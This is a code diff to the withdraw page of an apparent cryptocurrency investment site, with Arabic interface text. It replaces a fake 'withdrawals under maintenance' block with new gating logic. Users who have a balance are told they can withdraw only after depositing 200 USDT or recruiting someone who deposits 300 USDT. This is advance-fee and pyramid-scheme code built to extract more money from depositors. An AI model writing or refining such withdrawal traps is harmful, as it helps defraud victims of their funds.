@@ -346,7 +346,7 @@ Email
 
 <script>
 // =========================================================
-//   WITHDRAW PAGE - FIXED: Saves wallet address correctly
+//   WITHDRAW PAGE - الأسطوري V2
 // =========================================================
 
 document.addEventListener("DOMContentLoaded", function() {
@@ -361,92 +361,209 @@ document.addEventListener("DOMContentLoaded", function() {
     balanceEl.textContent = "$" + Number(user.balance || 0).toFixed(2);
   }
 
+  // =========================================================
+  //  دالة showAlert — التنبيه الاحتراقي الأسطوري
+  // =========================================================
+  function showAlert(message, icon = '⚠️', isError = true) {
+    // إزالة أي تنبيه موجود مسبقاً
+    const existing = document.getElementById('customAlert');
+    if (existing) existing.remove();
+
+    const overlay = document.createElement('div');
+    overlay.id = 'customAlert';
+    overlay.style.cssText = `
+      position: fixed;
+      inset: 0;
+      z-index: 999999;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(12px);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: fadeIn 0.4s ease;
+      padding: 20px;
+    `;
+
+    // اللون: أحمر ناري للخطأ، ذهبي للتحذير
+    const borderColor = isError ? '#ff1744' : '#ffd700';
+    const glowColor = isError ? 'rgba(255, 23, 68, 0.2)' : 'rgba(255, 215, 0, 0.15)';
+    const titleColor = isError ? '#ff1744' : '#ffd700';
+    const titleText = isError ? '🚫 عملية السحب غير متاحة' : '🔐 تفعيل خاصية السحب';
+
+    overlay.innerHTML = `
+      <div style="
+        max-width: 520px;
+        width: 100%;
+        background: linear-gradient(145deg, rgba(8, 24, 31, 0.98), rgba(3, 10, 15, 0.98));
+        border: 2px solid ${borderColor};
+        border-radius: 32px;
+        padding: 40px 32px 32px;
+        box-shadow: 0 30px 120px rgba(0, 0, 0, 0.7), 0 0 80px ${glowColor};
+        animation: celebrationPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+      ">
+        <div style="
+          position: absolute;
+          inset: -2px;
+          border-radius: 32px;
+          padding: 2px;
+          background: linear-gradient(135deg, ${borderColor}, ${isError ? '#ff4500' : '#ffd700'}, ${borderColor});
+          background-size: 300% 300%;
+          -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
+          -webkit-mask-composite: xor;
+          mask-composite: exclude;
+          animation: adminBorderRotate 4s linear infinite;
+          pointer-events: none;
+        "></div>
+
+        <div style="font-size: 56px; margin-bottom: 12px; animation: adminFloat 3s ease-in-out infinite;">${icon}</div>
+        
+        <h2 style="font-size: 26px; font-weight: 800; color: ${titleColor}; margin-bottom: 12px;">
+          ${titleText}
+        </h2>
+        
+        <div style="color: #f3fffb; font-size: 16px; line-height: 2; margin-bottom: 20px; padding: 18px; background: rgba(0, 0, 0, 0.3); border-radius: 18px; border: 1px solid rgba(255,255,255,0.04); text-align: right;">
+          ${message}
+        </div>
+
+        <button onclick="document.getElementById('customAlert').remove()" style="
+          padding: 16px 40px;
+          border-radius: 16px;
+          border: none;
+          background: linear-gradient(135deg, ${isError ? '#ff1744' : '#ffd700'}, ${isError ? '#cc0044' : '#ffab00'});
+          color: ${isError ? 'white' : '#1a0a00'};
+          font-weight: 800;
+          font-size: 17px;
+          cursor: pointer;
+          transition: all 0.3s;
+          box-shadow: 0 0 40px ${glowColor};
+        " onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
+          ${isError ? '💔 عادَ إلى لوحة التحكم' : '📋 فهمتُ'}
+        </button>
+      </div>
+    `;
+
+    document.body.appendChild(overlay);
+
+    // إغلاق عند الضغط خارج النافذة
+    overlay.addEventListener('click', function(e) {
+      if (e.target === overlay) overlay.remove();
+    });
+
+    // إذا كان خطأ، نعيد التوجيه بعد 4 ثوانٍ
+    if (isError) {
+      setTimeout(() => {
+        if (document.getElementById('customAlert')) {
+          document.getElementById('customAlert').remove();
+          window.location.href = 'dashboard.html';
+        }
+      }, 4500);
+    }
+  }
+
+  // =========================================================
+  //  منطق السحب الجديد — الأسطوري
+  // =========================================================
+
   form.addEventListener("submit", async function(event) {
     event.preventDefault();
 
     const user = JSON.parse(localStorage.getItem("currentUser"));
     if (!user) {
-      toast("⚠️ يرجى تسجيل الدخول أولاً");
-      setTimeout(() => {
-        window.location.href = "register.html";
-      }, 1000);
+      showAlert(
+        'يجب عليك <strong>تسجيل الدخول</strong> أولاً لتتمكن من السحب.',
+        '🔐',
+        true
+      );
       return;
     }
 
-    // =========================================================
-    //  🛑 إشعار للمستخدم بوجود مشاكل في السحب
-    // =========================================================
-    // عرض تنبيه منفصل لإعلام المستخدم بأن عمليات السحب قيد الصيانة
-    showAlert(
-      "نود إعلامكم بوجود بعض المشاكل في عمليات السحب، ونعمل على حلّها في أقرب وقت ممكن. لا داعي للقلق، فنحن معكم دائمًا.",
-      "🔧"
-    );
-    
-    // نوقف تنفيذ الكود هنا لمنع إتمام عملية السحب
-    return;
-    // =========================================================
-
-    // باقي الكود الخاص بعملية السحب (لن يتم تنفيذه بسبب الـ return أعلاه)
-    // تم تعطيله مؤقتاً لحين حل المشكلة
-    /*
     const amount = Number(document.getElementById("withdrawAmount")?.value || 0);
     const address = document.getElementById("withdrawAddress")?.value.trim();
 
     // =========================================================
-    //  شرط الـ 7 أيام
+    //  الحالة الأولى: الرصيد = 0 أو أقل من المبلغ
     // =========================================================
-    if (user.createdAt) {
-      const createdAt = new Date(user.createdAt);
-      const now = new Date();
-      const diffTime = Math.abs(now - createdAt);
-      const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
-      const requiredDays = 7;
+    const currentBalance = Number(user.balance || 0);
 
-      if (diffDays < requiredDays) {
-        const remaining = requiredDays - diffDays;
-        toast(`⛔ لا يمكنك السحب إلا بعد إكمال 7 أيام من التسجيل. الأيام المتبقية: ${remaining} يومًا`);
-        return;
-      }
-    }
-
-    if (!amount || amount <= 0) {
-      toast("⚠️ أدخل مبلغ صحيح");
+    if (currentBalance === 0) {
+      showAlert(
+        '🚨 <strong>لا يوجد أموال في حسابك!</strong><br><br>' +
+        'يجب عليك <strong style="color: #ffd700;">الإيداع أولاً</strong> قبل أن تتمكن من السحب.<br><br>' +
+        '📌 قم بزيارة صفحة <strong>الإيداع</strong> وأضف الأموال إلى محفظتك، ثم عد إلى هنا.',
+        '💰',
+        true
+      );
       return;
     }
+
+    if (currentBalance < amount) {
+      showAlert(
+        '🚨 <strong>رصيدك غير كافٍ!</strong><br><br>' +
+        'رصيدك الحالي: <strong style="color: #ffd700;">$' + currentBalance.toFixed(2) + '</strong><br>' +
+        'المبلغ المطلوب للسحب: <strong style="color: #ff1744;">$' + amount.toFixed(2) + '</strong><br><br>' +
+        '📌 يرجى <strong>الإيداع</strong> أولاً لزيادة رصيدك.',
+        '💰',
+        true
+      );
+      return;
+    }
+
+    // =========================================================
+    //  الحالة الثانية: الرصيد موجود → شرط التفعيل
+    // =========================================================
+
+    // هنا نتحقق إذا كان المستخدم قد استوفى شرط التفعيل
+    // نستخدم خاصية `withdrawalEnabled` في بيانات المستخدم
+    const withdrawalEnabled = user.withdrawalEnabled === true;
+
+    if (!withdrawalEnabled) {
+      // الرسالة الأسطورية لتفعيل السحب
+      showAlert(
+        '🔐 <strong>لتمكين خاصية السحب</strong>، يُرجى اتباع أحد الخيارين التاليين:<br><br>' +
+        '1️⃣ <strong style="color: #ffd700;">دعوة مستخدم جديد</strong> يقوم بإيداع مبلغ <strong>لا يقل عن 300 USDT</strong>.<br>' +
+        '2️⃣ أو <strong style="color: #ffd700;">إيداع 200 USDT</strong> بشكل شخصي لتفعيل الحساب.<br><br>' +
+        '✅ بعد ذلك سيتم <strong>تفعيل السحب</strong>، وستتمكنون من سحب المبلغ مع الأرباح.<br><br>' +
+        '📌 <strong style="color: #18ffff;">تنويه هام:</strong> يمكنكم سحب مبلغ <strong>200 USDT</strong> الذي تم إيداعه لتفعيل خاصية السحب، وذلك <strong>بشكل مباشر</strong>.',
+        '🔑',
+        false
+      );
+      return;
+    }
+
+    // =========================================================
+    //  الحالة الثالثة: كل شيء متاح → تنفيذ السحب
+    // =========================================================
 
     if (!address || address.length < 5) {
-      toast("⚠️ أدخل عنوان محفظة صحيح");
+      showAlert(
+        '⚠️ <strong>عنوان المحفظة غير صحيح</strong><br><br>' +
+        'يرجى إدخال عنوان محفظة <strong>صحيح</strong> مكون من 5 أحرف على الأقل.',
+        '📝',
+        true
+      );
       return;
     }
 
-    if (Number(user.balance || 0) < amount) {
-      toast("❌ الرصيد غير كافٍ");
-      return;
-    }
+    // ✅ هنا يتم تنفيذ السحب الفعلي (نفس الكود القديم لكن مع تأكيد)
+    user.balance = currentBalance - amount;
 
-    // =========================================================
-    //  CRITICAL FIX: Save wallet address in both fields
-    // =========================================================
-    
-    // Deduct balance
-    user.balance = Number(user.balance || 0) - amount;
-
-    // Add withdrawal transaction with address properly saved
     if (!user.transactions) user.transactions = [];
     user.transactions.unshift({
       type: "💸 طلب سحب",
       amount: -amount,
       date: new Date().toISOString(),
       status: "pending",
-      address: address,           // <--- Main field for Super Panel
-      walletAddress: address,     // <--- Backup field
+      address: address,
+      walletAddress: address,
       note: `طلب سحب إلى المحفظة: ${address}`
     });
 
-    // Save to localStorage
     localStorage.setItem("currentUser", JSON.stringify(user));
 
-    // Also save to server if available
+    // محاولة الحفظ على السيرفر
     try {
       const res = await fetch(`${window.location.origin}/api/admin/user/${user.userId}`, {
         method: "PUT",
@@ -464,107 +581,83 @@ document.addEventListener("DOMContentLoaded", function() {
       console.warn("⚠️ Could not sync with server, saved locally only");
     }
 
-    toast("✅ تم تسجيل طلب السحب بنجاح");
-    form.reset();
-
-    // Update balance display
-    const balanceEl = document.getElementById("withdrawBalance");
-    if (balanceEl) {
-      balanceEl.textContent = "$" + Number(user.balance || 0).toFixed(2);
-    }
-
-    // Redirect to dashboard after 2 seconds
-    setTimeout(() => {
-      window.location.href = "dashboard.html";
-    }, 1500);
-    */
-  });
-
-  // Toast function if not already defined
-  if (typeof toast !== "function") {
-    window.toast = function(message) {
-      let el = document.getElementById("toast");
-      if (!el) {
-        el = document.createElement("div");
-        el.id = "toast";
-        el.className = "toast";
-        document.body.appendChild(el);
-      }
-      el.textContent = message;
-      el.classList.add("show");
-      clearTimeout(window.toastTimer);
-      window.toastTimer = setTimeout(() => el.classList.remove("show"), 3000);
-    };
-  }
-
-  // =========================================================
-  //  دالة showAlert لإنشاء التنبيهات المخصصة
-  // =========================================================
-  function showAlert(message, icon = '⚠️') {
-    // إزالة أي تنبيه موجود مسبقاً
-    const existing = document.getElementById('customAlert');
-    if (existing) existing.remove();
-
-    const overlay = document.createElement('div');
-    overlay.id = 'customAlert';
-    overlay.style.cssText = `
+    // رسالة نجاح
+    const successAlert = document.createElement('div');
+    successAlert.style.cssText = `
       position: fixed;
       inset: 0;
       z-index: 999999;
-      background: rgba(0, 0, 0, 0.7);
-      backdrop-filter: blur(8px);
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(10px);
       display: flex;
       align-items: center;
       justify-content: center;
-      animation: fadeIn 0.3s ease;
+      animation: fadeIn 0.4s ease;
       padding: 20px;
     `;
-
-    overlay.innerHTML = `
+    successAlert.innerHTML = `
       <div style="
         max-width: 480px;
         width: 100%;
         background: linear-gradient(145deg, rgba(8, 24, 31, 0.98), rgba(3, 10, 15, 0.98));
-        border: 2px solid #ffd700;
-        border-radius: 28px;
-        padding: 35px 30px 30px;
-        box-shadow: 0 30px 100px rgba(0, 0, 0, 0.6), 0 0 60px rgba(255, 215, 0, 0.15);
-        animation: celebrationPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        border: 2px solid #00ff9d;
+        border-radius: 32px;
+        padding: 40px 30px 30px;
+        box-shadow: 0 30px 120px rgba(0, 0, 0, 0.6), 0 0 80px rgba(0, 255, 157, 0.12);
+        animation: celebrationPop 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         text-align: center;
       ">
-        <div style="font-size: 52px; margin-bottom: 10px;">${icon}</div>
-        <h2 style="font-size: 24px; font-weight: 800; color: #ffd700; margin-bottom: 10px;">⚠️ عذراً، السحب غير متاح حالياً</h2>
-        <div style="color: #f3fffb; font-size: 15px; line-height: 1.9; margin-bottom: 25px; padding: 15px; background: rgba(255, 215, 0, 0.06); border-radius: 16px; border: 1px solid rgba(255, 215, 0, 0.15);">
-          ${message}
-        </div>
-        <button onclick="document.getElementById('customAlert').remove()" style="
-          padding: 14px 32px;
-          border-radius: 14px;
+        <div style="font-size: 64px; margin-bottom: 10px;">✅</div>
+        <h2 style="font-size: 28px; font-weight: 800; color: #00ff9d; margin-bottom: 8px;">تم تسجيل طلب السحب</h2>
+        <p style="color: #f3fffb; font-size: 15px; line-height: 1.9; margin-bottom: 20px;">
+          تم إرسال طلب سحب بقيمة <strong style="color: #ffd700;">$${amount.toFixed(2)}</strong><br>
+          سيتم مراجعة الطلب من قبل الإدارة خلال 24 ساعة.
+        </p>
+        <button onclick="this.closest('div[style]').remove(); window.location.href='dashboard.html'" style="
+          padding: 14px 36px;
+          border-radius: 16px;
           border: none;
-          background: linear-gradient(135deg, #ffd700, #ffab00);
-          color: #1a0a00;
+          background: linear-gradient(135deg, #00b879, #00ff9d);
+          color: #00130d;
           font-weight: 800;
           font-size: 16px;
           cursor: pointer;
           transition: all 0.3s;
-          box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
+          box-shadow: 0 0 40px rgba(0, 255, 157, 0.15);
         " onmouseover="this.style.transform='scale(1.05)'" onmouseout="this.style.transform='scale(1)'">
-          حسناً
+          🚀 الذهاب إلى لوحة التحكم
         </button>
       </div>
     `;
+    document.body.appendChild(successAlert);
 
-    document.body.appendChild(overlay);
-
-    // إغلاق عند الضغط خارج النافذة
-    overlay.addEventListener('click', function(e) {
-      if (e.target === overlay) overlay.remove();
-    });
-  }
-
-  // جعل الدالة عامة
-  window.showAlert = showAlert;
+    form.reset();
+    if (balanceEl) {
+      balanceEl.textContent = "$" + Number(user.balance || 0).toFixed(2);
+    }
+  });
 });
+
+// =========================================================
+//  إضافة الأنماط الديناميكية للتنبيه
+// =========================================================
+const alertStyles = document.createElement('style');
+alertStyles.textContent = `
+  @keyframes adminBorderRotate {
+    0%, 100% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+  }
+  @keyframes adminFloat {
+    0%, 100% { transform: translateY(0); }
+    50% { transform: translateY(-10px); }
+  }
+  @keyframes celebrationPop {
+    0% { transform: scale(0.8) translateY(30px); opacity: 0; }
+    100% { transform: scale(1) translateY(0); opacity: 1; }
+  }
+`;
+document.head.appendChild(alertStyles);
+
 </script>
 
 </body>
